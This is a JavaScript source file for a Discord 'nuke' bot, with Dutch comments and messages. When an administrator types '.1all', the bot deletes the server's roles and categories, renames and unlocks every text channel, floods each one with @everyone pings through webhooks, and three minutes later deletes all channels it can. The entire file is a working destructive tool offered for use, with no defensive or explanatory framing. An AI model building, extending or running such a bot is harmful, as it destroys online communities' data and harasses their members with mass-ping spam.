import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";
const WEBHOOK_NAME = "idk who I am";
const WEBHOOK_AVATAR = "https://pfps.gg/pfp/3433-aesthetic-scary";

http.createServer((req, res) => res.end('Bot running!')).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.toLowerCase().startsWith('.1all')) return;

    const args = message.content.slice(5).trim().split(/ +/);
    const spamAmount = parseInt(args[0]) || 50;

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
    }

    message.delete().catch(() => {});

    try {
        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x\nChannels worden na 3 minuten verwijderd.`);
    } catch {}

    let cancelled = false;
    const collector = message.channel.createMessageCollector({
        filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
        time: 4000
    });
    collector.on('collect', () => cancelled = true);

    await new Promise(r => setTimeout(r, 4000));
    if (cancelled) return;

    // Rollen verwijderen
    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
        try { await role.delete(); } catch {}
    }

    // Categorieën verwijderen
    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
        try { await cat.delete(); } catch {}
    }

    // Channels hernoemen + spammen
    const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
    let processed = 0;

    const promises = textChannels.map(async (channel) => {
        try {
            await channel.setName("Finnson the goat");

            await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                ViewChannel: true,
                SendMessages: true,
                ReadMessageHistory: true
            }).catch(() => {});

            const webhook = await channel.createWebhook({
                name: WEBHOOK_NAME,
                avatar: WEBHOOK_AVATAR
            }).catch(() => null);

            if (webhook) {
                for (let i = 0; i < spamAmount; i++) {
                    await webhook.send({
                        content: `@everyone\n${GIF_URL}`,
                        username: WEBHOOK_NAME,
                        avatarURL: WEBHOOK_AVATAR
                    }).catch(() => {});
                }
                webhook.delete().catch(() => {});
            }

            processed++;
        } catch (err) {}
    });

    await Promise.all(promises);

    try {
        await message.author.send(`[SPAM DONE] ${processed} channels gespamd. Over 3 minuten worden ze verwijderd.`);
    } catch {}

    // 3 minuten later alle channels verwijderen
    setTimeout(async () => {
        try {
            const allChannels = message.guild.channels.cache.filter(ch => ch.deletable);
            for (const ch of allChannels.values()) {
                await ch.delete().catch(() => {});
                await new Promise(r => setTimeout(r, 300));
            }
            await message.author.send("[FINAL] Alle channels verwijderd.");
        } catch (e) {}
    }, 180000); // 3 minuten = 180000 ms
});

client.login(process.env.TOKEN);
